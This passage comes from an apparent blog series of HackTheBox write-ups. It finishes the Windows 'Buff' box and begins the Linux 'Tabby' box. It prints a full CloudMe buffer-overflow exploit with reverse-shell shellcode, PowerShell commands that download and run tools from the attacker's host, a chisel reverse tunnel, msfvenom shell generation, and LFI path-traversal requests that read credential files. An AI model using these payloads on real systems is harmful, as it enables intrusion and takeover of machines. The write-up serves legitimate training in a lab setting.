&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; type &amp;quot;C:\Users\shaun\Desktop\user.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
&lt;span class="code-line"&gt;�&lt;/span&gt;
&lt;span class="code-line"&gt;6c675c6c581ec9341b8ed8717c537e32&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;root&lt;/h1&gt;
&lt;p&gt;We can use our limited shell to download exec from our kali box (running a
simple python HTTP server) and execute them. For instance we can run
&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"&gt;winPEAS&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; powershell -exec bypass -c &amp;quot;(New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://10.10.14.24:8080/winPEAS.exe&amp;#39;, &amp;#39;.\winPEAS.exe&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; .\winPEAS.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cloudme"&gt;Cloudme&lt;/h2&gt;
&lt;p&gt;Still browsing our user's folders we found an specific binary in &lt;code&gt;Downloads&lt;/code&gt;:
&lt;code&gt;CloudMe_1112.exe&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; dir &amp;quot;C:\Users\Shaun\Downloads&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;�PNG&lt;/span&gt;
&lt;span class="code-line"&gt;�&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C has no label.&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is A22D-49F7&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of C:\Users\Shaun\Downloads&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;14/07/2020  13:27    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;14/07/2020  13:27    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;16/06/2020  16:26        17,830,824 CloudMe_1112.exe&lt;/span&gt;
&lt;span class="code-line"&gt;              1 File(s)     17,830,824 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              2 Dir(s)   9,639,174,144 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This also is a public software with some exploit available. For our specific
version (1.11.2), only four exploits applies.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit cloudme&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe 1.11.2 - Buffer Overflow (PoC)        | windows/remote/48389.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASL | windows/local/48499.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Cloudme 1.9 - Buffer Overflow (DEP) (Metasplo | windows_x86-64/remote/45197.rb&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(D | windows_x86-64/local/45159.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync 1.10.9 - Stack-Based Buffer Over | windows/remote/44175.rb&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync 1.11.0 - Local Buffer Overflow   | windows/local/44470.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync 1.11.2 - Buffer Overflow + Egghu | windows/remote/46218.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync 1.11.2 Buffer Overflow - WoW64 ( | windows_x86-64/remote/46250.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync &amp;lt; 1.11.0 - Buffer Overflow       | windows/remote/44027.py&lt;/span&gt;
&lt;span class="code-line"&gt;CloudMe Sync &amp;lt; 1.11.0 - Buffer Overflow (SEH) | windows_x86-64/remote/44784.py&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But as we saw earlier only the port 8080 is open on the box. The &lt;code&gt;CloudMe&lt;/code&gt;
software is only running locally on the box. We need to use some pivoting
technique to access the internal box services in order to use the exploit
&lt;code&gt;44470.py&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#######################################################&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Exploit Title: Local Buffer Overflow on CloudMe Sync v1.11.0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Date: 08.03.2018&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Vendor Homepage: https://www.cloudme.com/en&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Software Link: https://www.cloudme.com/downloads/CloudMe_1110.exe&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Category: Local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Exploit Discovery: Prasenjit Kanti Paul&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Web: http://hack2rule.wordpress.com/&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Version: 1.11.0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Tested on: Windows 7 SP1 x86&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# CVE: CVE-2018-7886&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Solution: Update CloudMe Sync to 1.11.2&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#######################################################&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Disclosure Date: March 12, 2018&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Response Date: March 14, 2018&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Bug Fixed: April 12, 2018&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Run this file in victim&amp;#39;s win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1052&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;eip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7B\x8A\xA9\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;      &lt;span class="c1"&gt;#68a98a7b : JMP ESP - Qt5Core.dll&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f c&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x18\x68&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;eip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="chisel"&gt;chisel&lt;/h2&gt;
&lt;p&gt;We will use &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md#chisel"&gt;chisel&lt;/a&gt;
in order to access &lt;code&gt;CloudMe&lt;/code&gt; service.&lt;/p&gt;
&lt;p&gt;On our kali we run &lt;code&gt;chisel&lt;/code&gt; in server mode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./chisel_1.6.0_linux_amd64 server -p 9001 -reverse&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using our limited shell we download our &lt;code&gt;chisel&lt;/code&gt; binary on the box and run it as
client on port &lt;code&gt;8888&lt;/code&gt; (remember this strange open port on the nmap scan?) as
CloudMe is also running on port 8888 (as stated on the exploit &lt;code&gt;44770.py&lt;/code&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\xampp\htdocs\gym\upload&amp;gt; powershell -exec bypass -c &amp;quot;(New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://10.10.14.24:8080/chisel.exe&amp;#39;, &amp;#39;.\chisel.exe&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\xampp\htdocs\gym\upload&amp;gt; .\chisel.exe client 10.10.14.24:9001 R:8888:localhost:8888&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The exploit &lt;code&gt;44770.py&lt;/code&gt; also told us to generate a new shellcode using
&lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We update the script with our shell code, configure the &lt;code&gt;metasploit&lt;/code&gt; handler and
run it as well as the exploit script (with &lt;code&gt;python 44470.py&lt;/code&gt;) . We got a shell as &lt;code&gt;administrator&lt;/code&gt; and can
get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.24:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 1 opened (10.10.14.24:4444 -&amp;gt; 10.10.10.198:53234) at 2020-07-25 12:07:33 -0400&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;whoami&lt;/span&gt;
&lt;span class="code-line"&gt;whoami&lt;/span&gt;
&lt;span class="code-line"&gt;buff\administrator&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;4ea57b2b8df4db2ea72531bcc50c5a86&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was really quick as it only require to exploit two CVE. The pivoting
technique was an interesting complication for an easy HTB machine.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="chisel"></category><category term="cloudme"></category></entry><entry><title>HTB: Tabby</title><link href="https://maggick.fr/2020/11/htb-tabby.html" rel="alternate"></link><published>2020-11-10T20:55:00+01:00</published><updated>2020-11-10T20:55:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-10:/2020/11/htb-tabby.html</id><summary type="html">&lt;p&gt;&lt;img alt="Tabby Card" class="align-left" src="/media/2020.11/tabby_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/259"&gt;Tabby&lt;/a&gt; publish on June
20 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egree55&lt;/a&gt;.
This box is rated as an easy box. The user part implies a Local File Inclusion
(LFI) and the tomcat manager. The root part implies LXC/LXD (Linux kernel
containment).&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.11/tabby_card.png" alt="Tabby Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/259"&gt;Tabby&lt;/a&gt; publish on June
20 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egree55&lt;/a&gt;.
This box is rated as an easy box. The user part implies a Local File Inclusion
(LFI) and the tomcat manager. The root part implies LXC/LXD (Linux kernel
containment).&lt;/p&gt;


&lt;h1 id="user-part"&gt;User part&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. As often with Windows Boxes, a lot of
port are open. A few interesting services are up:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH on port 22&lt;/li&gt;
&lt;li&gt;a Web service on port 80&lt;/li&gt;
&lt;li&gt;a Web service (Tomcat) on port 8080&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is the full nmap scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Jun 21 09:30:32 2020 as: nmap -p- -sSV -oN nmap 10.10.10.194&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.194&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.080s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http    Apache Tomcat&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;On port 8080 we have access to the tomcat administration component but we need
some credentials to access them.&lt;/p&gt;
&lt;p&gt;The main website is about hosting services but we quickly notice that the page
&lt;code&gt;news.php&lt;/code&gt; has a &lt;code&gt;file&lt;/code&gt; parameter.&lt;/p&gt;
&lt;p&gt;We manipulate the file and changing it to &lt;code&gt;../../../../../../../../etc/passwd&lt;/code&gt;
allows us to access the content of the file. We have a LFI and we want to use it
in order to access the tomcat users' file.&lt;/p&gt;
&lt;p&gt;We try the location mentioned on the page but the file is not accessible. We
need more information.&lt;/p&gt;
&lt;p&gt;We know that the server is an Ubuntu (look at the banner in the &lt;code&gt;nmap&lt;/code&gt; scan).&lt;/p&gt;
&lt;p&gt;We look at the files from the &lt;code&gt;tomcat9-admin&lt;/code&gt; package on the
&lt;a href="https://packages.ubuntu.com/focal/all/tomcat9-admin/filelist"&gt;packages.ubuntu.com website&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Therefore we get the &lt;code&gt;manager.xml&lt;/code&gt; file but there is nothing interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /news.php?file=../../../../../../../etc/tomcat9/Catalina/localhost/manager.xml HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: megahosting.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SNIP&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;Context path=&amp;quot;/manager&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;  docBase=&amp;quot;/usr/share/tomcat9-admin/manager&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;  antiResourceLocking=&amp;quot;false&amp;quot; privileged=&amp;quot;true&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the files from the &lt;code&gt;tomcat9&lt;/code&gt; package still on the
&lt;a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist"&gt;packages.ubuntu.com website&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This time we will try to get the &lt;code&gt;tomcat-users.xml&lt;/code&gt; file. This give an user and
its password. We also notice that its permissions are for the &lt;code&gt;admin-gui&lt;/code&gt; and
&lt;code&gt;manager-scrit&lt;/code&gt; NOT the classic &lt;code&gt;manager-gui&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /news.php?file=../../../../../../..//usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: megahosting.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SNIP&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;admin-gui&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;manager-script&amp;quot;/&amp;gt;&lt;/span&gt;
